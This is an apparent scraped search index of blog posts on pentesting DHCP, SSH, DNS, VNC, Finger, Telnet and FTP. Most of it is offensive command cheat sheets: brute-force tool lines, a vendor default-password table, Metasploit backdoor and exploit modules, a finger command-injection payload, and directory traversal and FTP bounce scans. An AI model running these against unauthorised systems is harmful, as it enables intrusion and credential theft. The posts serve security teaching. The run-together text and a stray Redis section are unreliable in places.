attack.Fake DHCP Server: DHCPAfter the Starvation attack, the attacker can set up a Fake DHCP Server and orchestrate ‘man in the middle’ attacks or set their own machine as the default gateway and monitor the traffic.A Rogue DHCP Server is a DHCP Server installed by the attacker on the target network. Fake DHCP Servers can generally be used for attacks such as MITM and sniffing on the target network.By performing a DHCP Starvation attack with the pig.py tool, the real DHCP Server on the network can be rendered unresponsive. Thus, there is no suitable IP address to be distributed to new clients on the network. This type of attack is very effective when clients on the network are online for a long time. Otherwise, it is necessary to repeat the attack at certain intervals.ExecutionYersinia tool is an inbuilt tool in kali linux, infact it is an hidden tool, we need to install it with apt install yersinia command. We have to launch yersinia graphical launcher with the command with  sudo yersinia -G # You need to start with sudo permissions.Click on the launch attack option in the tool bar and we have to choose DHCP tab in choose protocol attack dialogue box.Next we need to choose sending DISCOVER packet option in DHCP tab then click okYou can notice increase in packets in the left tab along the side of DHCP Protocol. I tried disconnecting mobile from the network and reconnecting again but I can’t.At this situation an attacker can start his Rogue DHCP Server so every client will be connected to the network through his DHCP Server so he can use it for malicious activities.In yersinia itself we can configure our Rogue DHCP Server.We can list the running attacks by choosing the button List Attacks in tool bar. we can stop the sending of packets in there.We can defend this DHCP Starvation attack by several methods such as The 802.11 association process prevents MAC address spoofing. Verify DHCP Proxy is enabled on WLCs to prevent DHCP chaddr spoofing Enabling of DHCP Snooping can avoid DHCP Starvation attacks.We can also perform DHCP starvation attack by using another tools also using DHCPig also." }, { "title": "SSH Pentesting Best Practices", "url": "/posts/ssh-pentesting-best-practices/", "categories": "pentesting protocols, ssh", "tags": "pentesting, ssh, best practicies", "date": "2022-06-06 00:00:00 +0300", "snippet": "SSH SSH usually uses port 22What is SSH?SSH or Secure Shell is a network communication protocol that enables two computers to communicate (c.f http or hypertext transfer protocol, which is the protocol used to transfer hypertext such as web pages) and share data. An inherent feature of ssh is that the communication between the two computers is encrypted meaning that it is suitable for use on insecure networks.PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH4.7p1 Debian 8ubuntu1 (protocol 2.0)SSH Working PrincipleThe protocol works in the client-server model, which means that the connection is established by the SSH client connecting to the SSH server. The SSH client drives the connection setup process and uses public key cryptography to verify the identity of the SSH server. After the setup phase the SSH protocol uses strong symmetric encryption and hashing algorithms to ensure the privacy and integrity of the data that is exchanged between the client and server.The figure below presents a simplified setup flow of a secure shell connection.client- ssh-server connectionSSH Pentesting Shodan search query : port:22 openssh -port:22 Banner Grabbingtelnet 10.10.x.x 22nc -nv 10.10.x.x 22scanssh -p -r -e excludes 10.10.x.x/24 (https://www.monkey.org/~provos/scanssh/)#Metasploit Framework:msf &gt; use auxiliary/scanner/ssh/ssh_versionmsf &gt; use auxiliary/scanner/ssh/detect_kippo #This module will detect if an SSH server is running a Kippo honeypot#Nmap Scripts:nmap -sC -p22 10.10.x.x # Send default nmap scripts for SSHnmap -sV -p22 10.10.x.x # Retrieve versionnmap -p22 10.10.x.x --script ssh2-enum-algos # Retrieve supported algorythms nmap -p22 10.10.x.x --script ssh-hostkey --script-args ssh_hostkey=full # Retrieve weak keysnmap -p22 10.10.x.x --script ssh-auth-methods --script-args=\"ssh.user=root\" # Check authentication methodsSSH Banner Grabbing with nmap banner scriptSupported Authentication Methods (password, private key)nmap -p 22 --script ssh-auth-methods --script-args=\"ssh.user=&lt;username&gt;\" 10.10.x.xssh authentication methods enumeration with nmap scriptSSH Connection ToolsLinux &amp; Macssh username@10.10.x.x #If ssh is running on another port, the -p parameter should be used.#IPv6: ssh username@fe80::b0ec:afd2:a932:252c%9Windows: Putty Filezilla WinscpSSH CredentialsSSH Brute Forcing#Metasploit ssh brute forcemsf &gt; use auxiliary/scanner/ssh/ssh_login#Metasploit username enumeration with brute forceuse auxiliary/scanner/ssh/ssh_enumusers#Nmap Brute Forcenmap -p 22 --script ssh-brute --script-args userdb=users.list,passdb=pass.list \\--script-args ssh-brute.timeout=4s 10.10.x.x#Other Brute Forcing Methodshydra -L users.txt -P passwords.txt ssh://10.10.x.x -t 8medusa -t 2 -T2 -U /root/Desktop/user.txt -P /root/Desktop/pass.txt -H /root/Desktop/host.txt -n 22 -M sshncrack -g CL=2 -U users.list -P passwords.list -iL targetIPs.list -p ssh:22 -oA Results.txtpatator ssh_login host=10.10.x.x user=FILE0 password=FILE1 0=users.list 1=passwords.list persistent=0 -x ignore:mesg=’Authentication failed.’./guess-who -l username -h 10.10.x.x -p 22 -2 &lt; passwords.list (https://packetstormsecurity.com/groups/teso/guess-who-0.44.tgz)SSH Default Credentials for Vendors Vendor Username Password APC apc, device apc Brocade admin admin123, password, brocade, fibranne Cisco admin, cisco, enable, hsa, pix, pnadmin, ripeop, root, shelladmin admin, Admin123, default, password, secur4u, cisco, Cisco, _Cisco, cisco123, C1sco!23, Cisco123, Cisco1234, TANDBERG, change_it, 12345, ipics, pnadmin, diamond, hsadb, c, cc, attack, blender, changeme Citrix root, nsroot, nsmaint, vdiadmin, kvm, cli, admin C1trix321, nsroot, nsmaint, kaviza, kaviza123, freebsd, public, rootadmin, wanscaler D-Link admin, user private, admin, user Dell root, user1, admin, vkernel, cli calvin, 123456, password, vkernel, Stor@ge!, admin EMC admin, root, sysadmin EMCPMAdm7n, Password#1, Password123#, sysadmin, changeme, emc HP/3Com admin, root, vcx, app, spvar, manage, hpsupport, opc_op iMC123, pvadmin, passw0rd, besgroup, vcx, nice, access, config, 3V@rpar, 3V#rpar, procurve, badg3r5, OpC_op, !manage, !admin Huawei admin, root 123456, admin, root, Admin123, Admin@storage, Huawei12#$, HwDec@01, hwosta2.0, HuaWei123, fsp200@HW, huawei123 IBM USERID, admin, manager, mqm, db2inst1, db2fenc1, dausr1, db2admin, iadmin, system, device, ufmcli, customer PASSW0RD, passw0rd, admin, password, Passw8rd, iadmin, apc, 123456, cust0mer Juniper netscreen netscreen NetApp admin netapp123 Oracle root, oracle, oravis, applvis, ilom-admin, ilom-operator, nm2user changeme, ilom-admin, ilom-operator, welcome1, oracle VMware vi-admin, root, hqadmin, vmware, admin vmware, vmw@re, hqadmin, default VulnerabilitiesSpecific Vulnerabilities and Exploits#Fortinet SSH backdoor [CVE-2016-1909]msf &gt; auxiliary/scanner/ssh/fortinet_backdoor#JuniperSSH backdoor [CVE-2015-7755]msf &gt; auxiliary/scanner/ssh/juniper_backdoor#F5 BIG-IP &lt; 9.4.8-HF5, 10.2.4, 11.0.0-HF2, 11.1.0-HF3; Enterprise Manager &lt; 2.1.0-HF2, 2.2.0-HF1, 2.3.0-HF3 [CVE-2012-1493]msf &gt; exploit/linux/ssh/f5_bigip_known_privkey#Freesshd &lt;= 1.2.6 / Windows (Universal) [CVE-2012-6066]FreeBSD OpenSSH 3.5.p1Exploit-DB: 17462.txtmsf &gt; exploit/windows/ssh/freesshd_authbypassSome TipsList of some static Host and Authentication keys:GitHub - rapid7/ssh-badkeys: A collection of static SSH keys (public and private) that have made their way into software and hardware products. GitHub Repo for static Host and Authentication keysThe keys of the previously connected servers can be listed on the compromised computer.ssh-keyscan -t rsa,dsa,ecdsa,ed25519 -p 22 10.10.x.xThe keys of the previously connected servers on the compromised computer.Running a command over SSH with a keyssh -o PasswordAuthentication=no -o BatchMode=yes -v -p 22 -i key -l username 10.10.x.x 'command'SFTP Tunnelingsudo ssh -L &lt;local-port&gt;:10.10.x.x:&lt;remote-port&gt; -N -f username@10.10.x.x" }, { "title": "DNS Pentesting Best Practices", "url": "/posts/dns-pentesting-best-practicies/", "categories": "pentesting protocols, dns", "tags": "pentesting, dns, best practicies", "date": "2022-06-06 00:00:00 +0300", "snippet": "DNS DNS usually uses port 53What is DNS?DNS working logicDNS is a domain name system that allows users to connect to websites using domain names instead of IP addresses. DNS, it is a system that resolves a domain name given to a fixed IP address.PORT STATE SERVICE VERSION53/udp open domain How is DNS working? When “secybr.com” is typed in the address bar of the browser, a DNS Query is sent to determine the IP address of the website. This request is first asked to our computer’s DNS cache. If it is among the records, the remaining steps are skipped and automatically redirected to “secybr.com”. If it doesn’t have a record in our DNS cache, the query is sent to our local DNS server. This is usually the servers of our internet provider and they are called resolvers. If no DNS records are found in the resolver, the query is directed to another server called “Root Name Server” to find DNS records. Root Name Servers are the servers responsible for the storage of DNS data worldwide and the smooth operation of the system. After the DNS record is found by the root Name Server, it returns to our computer and is cached by our computer.Common DNS VulnerabilitiesLike every system, there are security vulnerabilities on DNS. We will now review some of the major attacks on DNS servers.DNS Zone Transfer Vulnerabilityzonetransfer.me zonetransfer vulnerability detection with digIn some cases, DNS servers can share DNS records with each other over the AXFR protocol. There are two main reasons why DNS records are shared. One is load balancing and the other is what we call fault tolerance, that is, when a server becomes unserviceable, it is to ensure that the other server executes the operations. If unauthorized persons are allowed to perform DNS Zone Transfer due to lack of configuration, access to all address records entered in the DNS server may be in question. Thus, attackers can have information about systems with DNS records.AXFR does not offer authentication, so any client can request a copy of all DNS records from a DNS server. This means that unless some form of protection is introduced, an attacker could get a list of all the servers for the domain and give them lots of potential attack vectors. To prevent this vulnerability from occurring, the DNS server must be configured to allow DNS Zone Transfer only from trusted IP addresses.DNS Cache PoisoningThis vulnerability is a incorrect or intentional entry of information into the DNS cache. So DNS queries return an incorrect response and users are redirected to the wrong websites. E.g; If we think that an attacker has taken control of a DNS server, when he replaces the IP address of secybr.com with the IP address he created through the cache, he will direct users to the site he created instead of secybr.com. DNS servers use UDP protocol instead of TCP. These attacks can be very effective as there is no authentication method for the UDP protocol.Windows DNS Server Remote Code ExecutionCheck Point security researchers have released a critical vulnerability affecting DNS servers with code CVE-2020-1350. What makes this vulnerability effective is that it has existed for 17 years. The attacker can send the DNS requests he created specifically to the target DNS server and run remote commands on the system with high authority. Malware can use this vulnerability to infiltrate systems and encrypt data. Considering that an estimated 140,000 DNS servers are open to the internet, you can imagine how big the attack could be.DNS Pentesting Shodan search query : port:53 port:\"53\" \"Recursion: enabled” Banner GrabbingDNS does not have any “banners”. A query is available to detect the version. CHAOS TXT that will work on most BIND nameservers.You can perform this query using dig:dig version.bind CHAOS TXT @DNSZone Transfer Checksudo nmap -Pn -sU --script=dns-check-zone -p 53 secybr.com #Port scan and trying zone transferdig axfr @&lt;DNS_IP&gt; #Try zone transfer without domaindig axfr @&lt;DNS_IP&gt; &lt;DOMAIN&gt; #Try zone transfer guessing the domainTo Gather More Information With “dig”dig ANY @&lt;DNS_IP&gt; &lt;DOMAIN&gt; #Any informationdig A @&lt;DNS_IP&gt; &lt;DOMAIN&gt; #Regular DNS requestdig AAAA @&lt;DNS_IP&gt; &lt;DOMAIN&gt; #IPv6 DNS requestdig TXT @&lt;DNS_IP&gt; &lt;DOMAIN&gt; #Informationdig MX @&lt;DNS_IP&gt; &lt;DOMAIN&gt; #Emails relateddig NS @&lt;DNS_IP&gt; &lt;DOMAIN&gt; #DNS that resolves that namedig -x 10.10.x.x @&lt;DNS_IP&gt; #Reverse lookupdig -x 2a00:1450:400c:c06::93 @&lt;DNS_IP&gt; #reverse IPv6 lookup#Use [-p PORT] or -6 (to use ivp6 address of dns)nslookupnslookup&gt; SERVER &lt;IP_DNS&gt; #Select dns server&gt; 127.0.0.1 #Reverse lookup of 127.0.0.1, maybe...&gt; &lt;IP_MACHINE&gt; #Reverse lookup of a machine, maybe...Useful Metasploit Modulesmsf &gt; use auxiliary/gather/enum_dns #Perform enumeration actionsUseful nmap Scriptssudo nmap -Pn -sU -n --script \"(default and *dns*) or fcrdns or dns-srv-enum or dns-random-txid or dns-random-srcport\" &lt;IP_DNS&gt;To Gather More Information With “dnsrecon”dnsrecon -r 192.168.x.x/24 -n &lt;IP_DNS&gt; #DNS reverse of all of the addressesdnsrecon -r 192.168.x.x/24 -n &lt;IP_DNS&gt; #DNS reverse of all of the addressesdnsrecon -r 192.168.x.x/24 -n &lt;IP_DNS&gt; #DNS reverse of all of the addressesdnsrecon -d secybr.com -a -n &lt;IP_DNS&gt; #Zone transferDNS Brute ForcingYou can use this tool for DNS brute forcing : dnscandnsrecon -D subdomains-1000.txt -d secybr.com -n &lt;IP_DNS&gt;dnscan -d secybr.com -r -w subdomains-1000.txt #Bruteforce subdomains in recursive way,Active Directory Serversdig -t _gc._tcp.lab.secybr.comdig -t _ldap._tcp.lab.secybr.comdig -t _kerberos._tcp.lab.secybr.comdig -t _kpasswd._tcp.lab.secybr.com# Zone Transfer using dig# Find AD-DS through DNS# Global Catalogdig -t SRV _gc._tcp.lab.secybr.com# LDAP serversdig -t SRV _ldap._tcp.lab.secybr.com# Kerberos KDCdig -t SRV _kerberos._tcp.lab.secybr.com# Kerberos password change serverdig -t SRV _kpasswd._tcp.lab.secybr.comnmap --script dns-srv-enum --script-args “dns-srv-enum.domain='lab.secybr.com'”Finding Subdomains With nmap Scriptsnmap -sSU -p53 --script dns-nsec-enum --script-args dns-nsec-enum.domains=domain.com ns3.isc-sns.infoIPv6Using brute force attack using “AAAA” requests to collect IPv6 of subdomainsdnsdict6 zonetransfer.mednsdict6 -s -t zonetransfer.mehttps://github.com/vanhauser-thc/thc-ipv6Bruteforce reverse DNS in using IPv6 addressesdnsrevenum6 pri.authdns.ripe.net 1301:37d:2e8::/48 #Will use the dns pri.authdns.ripe.netDNS Recursion DDoSIf DNS recursion is enabled, an attacker could spoof the origin on the UDP packet in order to make the DNS send the response to the victim server. An attacker could abuse ANY or DNSSEC record types as they use to have the bigger responses.# Check DNS Recursion availablesudo nmap -Pn -sU -p 53 --script=dns-recursion &lt;IP_DNS&gt;The way to check if a DNS supports recursion is to query a domain name and check if the flag “ra” (recursion available) is in the response:dig secybr.com A @&lt;IP_DNS&gt;Non available:there is no “ra” flag. So there isn’t vulnerabilityit says that it has already thrown the recursion request in the logs and that it is not available. WARNING: recursion requested but not availableAvailable:To Gather More Information with FierceYou can take Fierce from herefierce --domain twitter.com --subdomains accounts admin adsfierce --domain facebook.com --subdomains admin --traverse 10fierce --domain facebook.com --subdomains admin --search fb.com fb.netfierce --domain stackoverflow.com --subdomains mail --connectfierce --domain facebook.com --widefierce --domain zonetransfer.mefierce --domain zonetransfer.me &gt; output.txtfierce --dns-servers 10.0.0.1 --range 10.0.0.0/24" }, { "title": "VNC Pentesting Best Practices", "url": "/posts/vnc-pentesting-best-practices/", "categories": "pentesting protocols, vnc", "tags": "pentesting, vnc, best practicies", "date": "2022-06-05 00:00:00 +0300", "snippet": "VNC VNC usually uses ports 5800 or 5801 or 5900 or 5901.What is VNC?It is a cross-platform screen sharing system that was created to remotely control another computer. This means that a computer’s screen, keyboard, and mouse can be used from a distance by a remote user from a secondary device as though they were sitting right in front of it.VNC works on a client/server model. A server component is installed on the remote computer (the one you want to control), and a VNC viewer, or client, is installed on the device you want to control from. This can include another computer, a tablet, or a mobile phone. When the server and viewer are connected, the server transmits a copy of the remote computer’s screen to the viewer.PORT STATE SERVICE VERSION5900/tcp open vnc VNC (protocol 3.3)VNC Pentesting Shodan search query : port:5800,5801,5900,5901 port:5901 authentication disabled rfb authentication disabled Banner Grabbing#Nmap Scripts:nmap -sV --script vnc-info,realvnc-auth-bypass,vnc-title -p &lt;PORT&gt; 10.10.x.x#Metasploit Framework:msf&gt; use auxiliary/scanner/vnc/vnc_none_authVNC CredentialsDecrypting VNC PasswordDefault password is stored in: ~/.vnc/passwd. If you have the VNC password and it looks encrypted (a few bytes, like if it could be and encrypted password). It is probably ciphered with 3des. You can get the clear text password using vncpwd. Because in 3des the password used to encrypt plaintext VNC passwords was reversed years ago.GitHub - jeroennijhof/vncpwd: VNC Password Decrypter VNC Password Decrypter repository.makevncpwd &lt;vnc password file&gt;Connection ToolsDebian:vncviewer [-passwd passwd.txt] [10.10.x.x]::5901vncviewer [-passwd password] [10.10.x.x]::5901Windows: VNC Viewer : https://www.realvnc.com/en/connect/download/viewer/windows/" }, { "title": "Finger Pentesting Best Practices", "url": "/posts/finger-pentesting-best-practices/", "categories": "pentesting protocols, finger", "tags": "pentesting, finger, best practicies", "date": "2022-06-05 00:00:00 +0300", "snippet": "Finger Finger usually uses port 79What is Finger?Finger is a program you can use to find information about computer users. It usually lists the login name, the full name, and possibly other details about the user you are fingering. These details may include the office location and phone number (if known), login time, idle time, time mail was last read, and the user’s plan and project files.PORT STATE SERVICE VERSION79/tcp open fing Debian fingerd Finger Pentesting Shodan search query : port:79 Banner Grabbingnc -vn 10.10.x.x 79echo \"root\" | nc -vn 10.10.x.x 79Finger CredentialsUser Enumerationfinger @10.10.x.x #List usersfinger admin@10.10.x.x #Get info of userfinger user@10.10.x.x #Get info of user#########finger admin@192.186.x.x Login: admin Name: Jhon Doe Directory: /home/admin Shell: /bin/bash Never logged in. No mail. No Plan.Alternatively you can use finger-user-enum from pentestmonkey, some examples:Download script and run it with a wordlist: HEREfinger-user-enum.pl is a tool for enumerating OS-level user accounts via the finger service. As of release v1.0 it is known to work against the default Solaris daemon. It may not yet work against all daemons since there is no defined format for the data returned by the finger service.finger-user-enum.pl -U users.txt -t 10.10.x.xfinger-user-enum.pl -u root -t 10.10.x.xfinger-user-enum.pl -U users.txt -T ips.txtMetasploit module for user enumerationmsf &gt; use auxiliary/scanner/finger/finger_usersCode Executionfinger \"|/bin/id@10.10.x.x\"finger \"|/bin/ls -a /@10.10.x.x\"Finger Bouncefinger user@host@victimfinger @internal@external" }, { "title": "Telnet Pentesting Best Practices", "url": "/posts/telnet-pentesting-best-practices/", "categories": "pentesting protocols, telnet", "tags": "pentesting, telnet, best practicies", "date": "2022-06-04 00:00:00 +0300", "snippet": "Telnet Telnet usually uses port 23,992What is Telnet?Telnet is a network protocol used to virtually access a computer and to provide a two-way, collaborative and text-based communication channel between two machines.PORT STATE SERVICE VERSION23/tcp open telnet Redis Password Authentication Bruteforcing Methods#Metasploit Frameworkmsf&gt; use auxiliary/scanner/redis/redis_loginTelnet Pentesting Shodan search query : port:23 # You can use this command only on your shodan-cli : shodan stream --ports 23,1023,2323 --datadir telnet-data/ --limit 10000 Banner Grabbingtelnet 10.10.x.x 23nc 10.10.x.x 23Nmap: bannernc -vn 10.10.x.x 23nmap -n -sV -Pn --script \"*telnet* and safe\" -p 23 10.10.x.xmsf &gt; use auxiliary/scanner/telnet/telnet_versionmsf &gt; use auxiliary/scanner/telnet/lantronix_telnet_versionTelnet version grabbing with metasploit module.Connection ToolsLinux:telnet -l username 10.10.x.x 23Windows: PuttyTelnet VulnerabilitiesSpecific Vulnerabilities and Exploits#BOF: FreeBSD 7.3 – 9.0; MIT Kerberos v5 Applications (krb5-appl) &lt;= 1.0.2; Heimdal &lt;= 1.5.1; GNU inetutils [CVE-2011-4862]msf &gt; use auxiliary/scanner/telnet/telnet_encrypt_overflowmsf &gt; use exploit/linux/telnet/telnet_encrypt_keyidmsf &gt; use exploit/freebsd/telnet/telnet_encrypt_keyid#SenNet Optimal DataLogger &lt;= V5.37c-1.43c; SenNet Solar Datalogger &lt;= V5.03-1.56a; SenNet Multitask Meter &lt;= V5.21a-1.18b [CVE-2017-6048] [TCP/5000]msf &gt; use auxiliary/scanner/telnet/satel_cmd_exec#RuggedCom Rugged Operating System (ROS) Telnet backdoor [CVE-2012-1803]Exploit-DB: 18779.txtmsf &gt; use auxiliary/scanner/telnet/telnet_ruggedcom#Lantronix Device Server V5.8.0.1 [UDP\\30718]msf &gt; use auxiliary/scanner/telnet/lantronix_telnet_passwordThere are also product-based vulnerabilities and scripts for vulnerabilities.IBM CICS:#Nmap Scripts:nmap --script=cics-enum -p 23 10.10.x.xnmap --script=cics-user-enum -p 23 10.10.x.xIBM TN32701:#Nmap Scripts:nmap --script tn3270-info,tn3270_screen 10.10.x.xTelnet CredentialsBrute Forcinghydra -t 2 -L users.list -P passwords.list -M TargetIPs.list -s 23 telnetmedusa -t 2 -T 2 -U users.list -P passwords.list -H TargetIPs.list -n 23 -M telnetncrack -g CL=2 -U users.list -P passwords.list -iL TargetIPs.list -p telnet:23 -oA Result.txtmsf &gt; use auxiliary/scanner/telnet/telnet_login" }, { "title": "FTP Pentesting Best Practices", "url": "/posts/ftp-pentesting-best-practices/", "categories": "pentesting protocols, ftp", "tags": "pentesting, ftp, best practicies", "date": "2022-06-04 00:00:00 +0300", "snippet": "FTP FTP usually uses port 21What is FTP?FTP (File Transfer Protocol) is used to communicate and transfer files between computers on a TCP/IP (Transmission Control Protocol/Internet Protocol) network, aka the internet. Users, who have been granted access, can receive and transfer files in the File Transfer Protocol server (also known as FTP host/site).PORT STATE SERVICE VERSION21/tcp open ftp ProFTPD 1.3.5 FTP Pentesting Shodan search query : port:21 # Anonymous FTP Login query: \"220\" \"230 Login successful.\" port:21 Banner Grabbingtelnet 10.10.x.x 21nc -nv 10.10.x.x 21nmap -sV -p21 --script=banner 10.10.x.x#Get certificate if anyopenssl s_client -connect 10.10.x.x:21 -starttls ftp FTP Banner grabbing with nmap banner scriptFTP Connection ToolsLinux:ftp 10.10.x.x# if FTP server running on different port and using ssl ftp-ssl 10.10.x.x 990Windows: Filezilla WinscpConnect to FTP using starttlslftplftp :~&gt; set ftp:ssl-force truelftp :~&gt; set ssl:verify-certificate nolftp :~&gt; connect 10.10.x.xlftp 10.10.x.x:~&gt; login Usage: login &lt;user|URL&gt; [&lt;pass&gt;]lftp 10.10.x.x:~&gt; login username PasswordBrowser Connectionftp://ftp.xyz.com ftp://anonymous:anonymous@10.10.x.x # Anonymous loginftp://username:password@ftp.secybr.com # To connect to a FTP server requiring a username with Firefox,ftp://0xhav0c:password@ftp.secybr.com # if my User name was 0xhav0c and my password was password, the FTP browser syntax would be:ftp://0xhav0c@secybr.com:password@ftp.secybr.com # In some cases, the User name includes a domain name such as 0xhav0c@secybr.com. In these situations, you would type:Mount remote FTP locallysudo apt-get install curlftpfsmkdir /mnt/my_ftpcurlftpfs ftp-user:ftp-pass@my-ftp-location.local /mnt/my_ftp/curlftpfs -o allow_other ftp-user:ftp-pass@my-ftp-location.local /mnt/my_ftp/ # To allow other usersDownload Everything From FTP Serverroot@Kali:~/ wget -m --no-passive ftp://anonymous:anonymous@10.10.x.x --2022-06-04 21:03:50-- ftp://anonymous:*password*@10.10.x.x/ =&gt; ‘10.10.x.x/.listing’ Connecting to 10.10.x.x:21... connected. Logging in as anonymous ... Logged in! ==&gt; SYST ... done. ==&gt; PWD ... done. ==&gt; TYPE I ... done. ==&gt; CWD not needed. ==&gt; PORT ... done. ==&gt; LIST ... done. 10.10.x.x/.listing [ &lt;=&gt; ] 97 --.-KB/s in 0s ==&gt; PORT ... done. ==&gt; LIST ... done. 10.10.x.x/.listing [ &lt;=&gt; ] 97 --.-KB/s in 0s 2022-06-04 21:03:50 (8.4 MB/s) - ‘10.10.x.x/.listing’ saved [194] --2022-06-04 21:03:50-- ftp://anonymous:*password*@10.10.x.x/Backups/ =&gt; ‘10.10.x.x/Backups/.listing’ ==&gt; CWD (1) /Backups ... done. ==&gt; PORT ... done. ==&gt; LIST ... done.FTP Credentials It might be helpful to try the passive mode. Sometimes it may allow you to connect in passive mode (ftp -p 192.168.x.x).In Active FTP the FTP client first initiates the control connection from its port N to FTP Servers command port – port 21. The client then listens to port N+1 and sends the port N+1 to FTP Server. FTP Server then initiates the data connection, from its port M to the port N+1 of the FTP Client. But, if the FTP Client has a firewall setup that controls the incoming data connections from outside, then active FTP may be a problem. And, a feasible solution for that is Passive FTP. In Passive FTP, the client initiates the control connection from its port N to the port 21 of FTP Server. After this, the client issues a passv comand. The server then sends the client one of its port number M. And the client initiates the data connection from its port P to port M of the FTP Server. File upload (PUT FileName.exe) or download (GET FileName.txt; mget FileName.txt) operations can be performed after login. In order for the file to be loaded to be added without being corrupted, the mode must be changed with the “binary” commands if this file is in binary format, and “ascii” commands if it is in ASCII format.Anonymous Login Check Methods#Manual Anonymous Login Combosanonymous : anonymousanonymous :ftp : ftp#Manual Anonymous Login With ftp-sslroot@secyber.com:~ ftp-ssl -p 88.255.104.161 990Connected to 88.255.104.161.220 Service Ready.Name (88.255.104.161:root): anonymous234 Enabling TLS Connection[SSL Cipher ECDHE-RSA-AES256-GCM-SHA384]502 Not supported502 Not supported331 Username ok, need passwordPassword:230 User logged inRemote system type is UNIX.Using binary mode to transfer files.#Anonymous Login Check With Metasploit Frameworkmsf &gt; use auxiliary/scanner/ftp/anonymousset RHOSTS 10.10.x.xset RPORT 21run#Nmap Script:nmap --script=ftp-anon -p21 10.10.x.x#ornmap -sV -sC -p21 10.10.x.xValid Users and Password Detection Methodsmsf &gt; use auxiliary/scanner/ftp/ftp_loginset RHOSTS 10.10.x.xset RPORT 21set PASS_FILE /usr/share/wordlists/passwords.txtset USER_FILE /usr/share/wordlists/users.txtrun#Nmap Script:nmap --script ftp-brute -p21 10.10.x.xTo connect to FTP, anyone can log in to the server if anonymous login is allowed by the administrator. An attacker can log in anonymously using the metasploit exploit or using the “ftp” tool.FTP Brute Forcing Methodshydra -t 2 -L user.list -P passwords.list -M targetIPs.list -s 21 ftpmedusa -t 2 -T 2 -U user.list -P passwords.list -H targetIPs.list -n 21 -M ftpncrack -g CL=2 -U user.list -P passwords.list -iL targetIPs.list -p ftp:21 -oA results.txtpatator ftp_login host=10.10.x.x user=FILE0 password=FILE1 0=users.list 1=passwords.list -x ignore:mesg=’Login incorrect.’ -x ignore,reset,retry:code=500#Metasploit Framework:msf &gt; use auxiliary/scanner/ftp/loginset RHOSTS 10.10.x.xset RPORT 21set PASS_FILE /usr/share/wordlists/passwords.txtset USER_FILE /usr/share/wordlists/users.txtrunCommon FTP VulnerabilitiesDirectory Traversal AttackA Directory Traversal attack (also known as path traversal) aims to access files and directories that are stored outside the intended folder. By manipulating files with “dot-dot-slash (../)” sequences and its variations, or by using absolute file paths, it may be possible to access arbitrary files and directories stored on file system, including application source code, configuration, and other critical system files.Directory Traversal vulnerabilities can be generally divided into two types: Information Disclosure: Allows the attacker to gain information about the folder structure or read the contents of sensitive files on the system. Writing arbitrary files: Allows the attacker to create or replace existing files. This type of vulnerability is also known as Zip-Slip.# ftp 192.168.13.22Connected to 192.168.13.22.220 Femitter FTP Server ready.Name (192.168.13.22:root): 331 Password required for root.Password:230 User root logged in.Remote system type is UNIX.Using binary mode to transfer files.ftp&gt; ls ../../../../200 Port command successful.150 Opening data connection for directory list.-rwxrwxrwx 1 ftp ftp 0 Sep 23 2015 AUTOEXEC.BAT-rw-rw-rw- 1 ftp ftp 0 Sep 23 2015 CONFIG.SYSdrw-rw-rw- 1 ftp ftp 0 Sep 23 2015 Documents and Settingsdr--r--r-- 1 ftp ftp 0 Sep 23 2015 Program Filesdrw-rw-rw- 1 ftp ftp 0 Sep 23 2015 WINDOWS226 File sent okftp&gt; ls ../../../../Docume~1/200 Port command successful.150 Opening data connection for directory list.drw-rw-rw- 1 ftp ftp 0 Sep 23 2015 .drw-rw-rw- 1 ftp ftp 0 Sep 23 2015 ..drw-rw-rw- 1 ftp ftp 0 Sep 26 2015 Administrateurdrw-rw-rw- 1 ftp ftp 0 Sep 23 2015 All Users226 File sent okFTP Bounce VulnerabilityThe FTP server is vulnerable to FTP bounce attacks. This vulnerability allows an FTP client to instruct the FTP server to make an outbound data connection to any IP and port, rather than restricting outbound connections back to the client’s IP address only. This can be used to map and port scan any networks visible to the FTP server, possibly including internal networks not directly accessible to the attacker.FTP bouncing is such a popular and easy to exploit reconnaissance attack that tools such as nmap include an FTP bounce scan option.FTP Bounce Vulnerability Check Methodnmap -sV --script ftp-bounce -p21 10.10.x.xmsf &gt; use auxiliary/scanner/portscan/ftpbounceLastly, you can check manually. If your FTP server is impacted from this vulnerability, you will have a result similar to the following:USER A331 Username okay, awaiting passwordPASS A230 User logged in, proceedPORT 172,19,0,100,0,1234200 The requested action has been successfully completed LIST150 File status okay; about to open data connection // We understood port 1234 is open226 Closing data connection PORT 172,19,0,100,0,4444200 The requested action has been successfully completed LIST425 No connection established // We understood port 4444 is closedFor example, an attacker using this vulnerability can scan ports in the internal network systems by using the following command:nmap -v -p 21,22,445,80,443 -b username:password@172.19.0.100 192.168.0.1/24Unsuccess FTP Bounce scan example output.Success FTP Bounce scan example output.Specific Vulnerabilities and Exploits, PoC’s and Nmap Scripts#OPIE &lt;= 2.4.1-test1 @ FreeBSD 6.4 – 8.1-PRERELEASE [CVE-2010-1938]nmap --script=ftp-libopie -p21 10.10.x.x#VSFTPD 2.3.4 [CVE-2011-2523]nmap --script=ftp-vsftpd-backdoor -p21 10.10.x.x#ProFTPd 1.3.3c [OSVDB 69562]nmap --script=ftp-proftpd-backdoor -p21 10.10.x.x#ProFTPD 1.3.2rc3 – 1.3.3b [CVE-2010-4221]nmap --script=ftp-vuln-cve2010-4221 -p21 10.10.x.x#Titan FTP Server &lt;= 8.10.1125 – Directory Traversal [CVE-2010-2426]msf &gt; use auxiliary/scanner/ftp/titanftp_xcrc_traversal#PCMan FTP Server 2.0.7 – Directory Traversal [CVE-2015-7601]msf &gt; use auxiliary/scanner/ftp/pcman_ftp_traversal#Konica Minolta FTP Utility 1.00 – Directory Traversal [CVE-2015-7603]msf &gt; use auxiliary/scanner/ftp/konica_ftp_traversal#BisonFTP Server 3.5 – Directory Traversal [CVE-2015-7602]msf &gt; use auxiliary/scanner/ftp/bison_ftp_traversal#ColoradoFTP Server &lt;= 1.3 Build 8 – Directory Traversal [EDB-40231]msf &gt; use auxiliary/scanner/ftp/colorado_ftp_traversal#Easy File Sharing FTP Server &lt;= 3.6 – Directory Traversal [CVE-2017-6510]msf &gt; use auxiliary/scanner/ftp/easy_file_sharing_ftp#VSFTPD 2.3.4 [CVE-2011-2523]msf &gt; use exploit/unix/ftp/vsftpd_234_backdoor#ProFTPD 1.3.2rc3 – 1.3.3b [CVE-2010-4221]msf &gt; use exploit/linux/ftp/proftp_telnet_iac#ProFTPD 1.3.3c [OSVDB-69562]msf &gt; use exploit/unix/ftp/proftpd_133c_backdoor#ProFTPd 1.3.5 